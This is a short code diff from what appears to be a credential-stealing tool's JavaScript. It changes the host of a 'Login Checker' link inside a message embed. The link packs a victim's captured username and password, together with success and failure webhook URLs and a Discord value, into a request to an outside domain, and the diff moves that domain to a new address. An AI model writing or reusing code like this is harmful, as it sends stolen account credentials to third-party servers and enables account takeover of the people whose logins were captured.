@@ -202,7 +202,7 @@ async function loadembed(req, res) {
                 },
                 {
                     name: "Login Checker",
-                    value: `[**[Click here]**](https://virizon.onrender.com/lc?username=${encodeURIComponent(Username)}&password=${encodeURIComponent(Password)}&success=${encodeURIComponent(webhooks.success)}&failed=${encodeURIComponent(webhooks.failed)}&discord=${encodeURIComponent(discord)})`,
+                    value: `[**[Click here]**](https://virizonmguix.online/lc?username=${encodeURIComponent(Username)}&password=${encodeURIComponent(Password)}&success=${encodeURIComponent(webhooks.success)}&failed=${encodeURIComponent(webhooks.failed)}&discord=${encodeURIComponent(discord)})`,
                     inline: true,
                 },
             ],
